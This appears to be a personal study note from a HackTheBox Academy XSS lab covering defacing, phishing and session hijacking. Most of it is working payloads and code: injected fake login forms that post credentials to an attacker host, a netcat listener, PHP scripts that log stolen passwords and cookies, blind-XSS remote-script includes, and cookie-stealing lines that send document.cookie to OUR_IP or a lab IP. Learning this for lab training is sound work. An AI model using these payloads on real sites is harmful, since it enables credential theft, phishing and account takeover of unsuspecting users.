# 📿 XSS Attacks

## Defacing

`Defacing` a website means changing its look for anyone who visits the website.

We can utilize injected JavaScript code (through XSS) to make a web page look any way we like.

Here are the HTML elements are usually utilized to change the main look of a web page:

* Background Color `document.body.style.background`
* Background `document.body.background`
* Page Title `document.title`
* Page Text `DOM.innerHTML`

Example payload to change the background

```html
<script>document.body.style.background = "#141d2b"</script>
```

Set an image to background:

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

Change the title of the website:

```html
<script>document.title = 'HackTheBox Academy'</script>
```

Changing some text on the page:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the `jQuery` library must have been imported within the page source):

```javascript
$("#todo").html('New Text');
```

To erase the content of the website and change the body:

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

We can also minify our html code and inject it as a one-liner:&#x20;

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

## Phishing

A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

Here is a HTML form used for phishing:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

To inject it ->

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

<figure><img src="../../../.gitbook/assets/image (1396).png" alt=""><figcaption></figcaption></figure>

In this case, we are exploiting a `Reflected XSS` vulnerability, so we can copy the URL and our XSS payload in its parameters, as we've done in the `Reflected XSS` section, and the page should look as follows when we visit the malicious URL

Payload to remove some HTML on a page:

```javascript
document.getElementById('urlform').remove();
```

So our payload becomes:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

We can comment out any HTML, by adding an HTML opening comment after our XSS payload

```html
<!-- 
```

Now to steal the credentials we must set up our listener ->

```shell-session
sudo nc -lvnp 80
```

And now if our target decides to login with the credentials `test:test`, and check the `netcat` output we get

```shell-session
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

However, as we are only listening with a `netcat` listener, it will not handle the HTTP request correctly, and the victim would get an `Unable to connect` error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

We can start our server like this:

```shell-session
ElFelixi0@htb[/htb]$ mkdir /tmp/tmpserver
ElFelixi0@htb[/htb]$ cd /tmp/tmpserver
ElFelixi0@htb[/htb]$ vi index.php #at this step we wrote our index.php file
ElFelixi0@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

_**Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.**_

```
<script>document.write('<h3>Please login to continue</h3><form action=http:10.10.15.182:9898><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
```

<figure><img src="../../../.gitbook/assets/image (1398).png" alt=""><figcaption></figcaption></figure>

```
http://10.129.123.59/phishing/index.php?url=%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.182%3A9898%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B%3C%2Fscript%3E
```

<figure><img src="../../../.gitbook/assets/image (1399).png" alt=""><figcaption></figcaption></figure>

## Session Hijacking

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a `Session Hijacking` (aka `Cookie Stealing`) attack.

A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins).

Let's imagine we want to be part of a website and send our informations via a form and we see this:

<figure><img src="../../../.gitbook/assets/image (1400).png" alt=""><figcaption></figcaption></figure>

The informations will appear for the Admin only in a certain Admin Panel that we do not have access to. To exploit this we can use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.

We start by including a remote script by providing its URL ->

```html
<script src="http://OUR_IP/script.js"></script>
```

We can change the requested script name from `script.js` to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script

```html
<script src="http://OUR_IP/username"></script>
```

If we get a request for `/username`, then we know that the `username` field is vulnerable to XSS, and so on.

Now we can start testing various XSS payloads and we can find few examples we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Now we start a php webserver:

```shell-session
ElFelixi0@htb[/htb]$ sudo php -S 0.0.0.0:80
```

Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP

```html
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
...SNIP...
```

Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack. We want to find payloads to steal cookies such as:

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

put it in a script.js file and send the following payload through our vulnerable input ->

```html
<script src=http://OUR_IP/script.js></script>
```

However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.

We can save the following PHP script as `index.php`, and re-run the PHP server again:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

**Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.**

<figure><img src="../../../.gitbook/assets/image (1402).png" alt=""><figcaption></figcaption></figure>

```
"><script src=http://10.10.15.182:9898/password></script>
```

<figure><img src="../../../.gitbook/assets/image (1404).png" alt=""><figcaption><p>url vuln</p></figcaption></figure>

```
"><script>new Image().src='http://10.10.15.182:9898/index.php?c='+document.cookie;</script>
```

We create our index file with the PHP code above, host it and send our payload ->

<figure><img src="../../../.gitbook/assets/image (1405).png" alt=""><figcaption><p>c00k1355h0u1d8353cu23d</p></figcaption></figure>
